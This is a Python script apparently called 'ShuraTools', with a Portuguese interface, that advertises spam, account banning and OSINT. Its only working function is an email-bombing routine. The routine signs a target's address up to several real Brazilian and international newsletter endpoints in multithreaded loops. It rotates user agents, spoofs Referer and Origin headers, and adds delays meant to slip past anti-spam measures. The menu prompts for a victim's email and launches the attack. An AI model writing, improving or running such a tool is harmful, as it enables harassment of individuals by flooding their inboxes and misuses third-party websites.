#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShuraTools.py – Swiss-army knife para spam, banimento e OSINT.
Versão Pro v3.1 Ultra-Mail
"""

import os
import sys
import time
import random
import string
import argparse
import threading
import json
import re
import socket
from queue import Queue

try:
    import requests
    from faker import Faker
    from colorama import Fore, Style, init
    init(autoreset=True)
    fake = Faker()
except ImportError:
    print("[!] Erro: Execute 'pip install requests faker colorama'")
    sys.exit(1)

BANNER = f"""
{Fore.CYAN}  _____ _    _ _    _ _____            
{Fore.CYAN} / ____| |  | | |  | |  __ \     /\    
{Fore.CYAN}| (___ | |__| | |  | | |__) |   /  \   
{Fore.CYAN} \___ \|  __  | |  | |  _  /   / /\ \  
{Fore.CYAN} ____) | |  | | |__| | | \ \  / ____ \ 
{Fore.CYAN}|_____/|_|  |_|\____/|_|  \_\/_/    \_\
                                       
{Fore.YELLOW}  >> SpamMail | OSINT | PortScan | Social <<
{Fore.RED}       v3.1 Ultra-Mail Edition - by Shura
"""

LOCK = threading.Lock()
PROXY_QUEUE = Queue()

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
]

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def log(msg, type="info"):
    colors = {
        "info": Fore.WHITE + "[*] ",
        "success": Fore.GREEN + "[+] ",
        "error": Fore.RED + "[-] ",
        "warn": Fore.YELLOW + "[!] ",
        "osint": Fore.MAGENTA + "[?] "
    }
    prefix = colors.get(type, Fore.WHITE)
    with LOCK:
        print(f"{prefix}{msg}{Style.RESET_ALL}")

# ---------- Endpoints de Alta Entrega (Triggers Reais) ----------
def spam_mail(target, qty, threads, use_proxy):
    # Endpoints que comprovadamente enviam e-mails em 2024/2025
    endpoints = [
        # Sites com assinaturas simples (POST Form ou JSON)
        {"url": "https://www.infoq.com/newsletter/subscribe.action", "data": {"email": target, "newsletterId": "1"}, "type": "form"},
        {"url": "https://www.tecmundo.com.br/newsletter", "data": {"email": target}, "type": "form"},
        {"url": "https://www.canaltech.com.br/newsletter/", "data": {"email": target}, "type": "form"},
        {"url": "https://p.newsletter.vtex.com/subscribe", "data": {"email": target, "list": "netshoes"}, "type": "form"},
        {"url": "https://newsletter.ig.com.br/subscribe", "data": {"email": target}, "type": "form"},
        {"url": "https://www.kabum.com.br/newsletter", "data": {"email": target}, "type": "form"},
        {"url": "https://www.mundoconectado.com.br/wp-admin/admin-ajax.php", "data": {"action": "newsletter_subscribe", "email": target}, "type": "form"},
        {"url": "https://api.vtex.com/v1/newsletter", "data": {"email": target}, "type": "json"}
    ]

    def job(start, end):
        session = requests.Session()
        for i in range(start, end):
            try:
                site = random.choice(endpoints)
                headers = {
                    "User-Agent": random.choice(UA_LIST),
                    "Referer": site["url"],
                    "Origin": "/".join(site["url"].split("/")[:3])
                }

                if site["type"] == "json":
                    headers["Content-Type"] = "application/json"
                    res = session.post(site["url"], json=site["data"], headers=headers, timeout=12)
                else:
                    headers["Content-Type"] = "application/x-www-form-urlencoded"
                    res = session.post(site["url"], data=site["data"], headers=headers, timeout=12)
                
                if res.status_code < 400:
                    log(f"E-mail {i+1} disparado via {site['url'].split('/')[2]}", "success")
                else:
                    log(f"Falha {i+1} (Status {res.status_code})", "error")
            
            except Exception as e:
                log(f"Erro {i+1}: Conexão falhou", "error")
            
            time.sleep(random.uniform(0.5, 1.5)) # Pequeno delay para evitar anti-spam imediato

    log(f"Ataque Ultra-Mail iniciado para {target}...", "info")
    chunk, rem = qty // threads, qty % threads
    ts = []
    curr = 0
    for i in range(threads):
        take = chunk + (1 if i < rem else 0)
        if take <= 0: continue
        t = threading.Thread(target=job, args=(curr, curr + take))
        t.start()
        ts.append(t)
        curr += take
    for t in ts: t.join()

def menu():
    while True:
        clear()
        print(BANNER)
        print("[ 1 ] Iniciar Spam de E-mail (Alta Entrega)")
        print("[ 2 ] Pesquisa OSINT")
        print("[ 0 ] Sair")
        print("-" * 40)
        opt = input(f"{Fore.YELLOW}Opção: {Style.RESET_ALL}").strip()
        if opt == "0": break
        if opt == "1":
            target = input(f"{Fore.YELLOW}Alvo (email): {Style.RESET_ALL}").strip()
            if "@" in target:
                spam_mail(target, 40, 5, False)
                input("\nVerifique as abas PROMOÇÕES e SPAM. ENTER para voltar...")
            else:
                log("E-mail inválido!", "error"); time.sleep(1)

if __name__ == "__main__":
    menu()
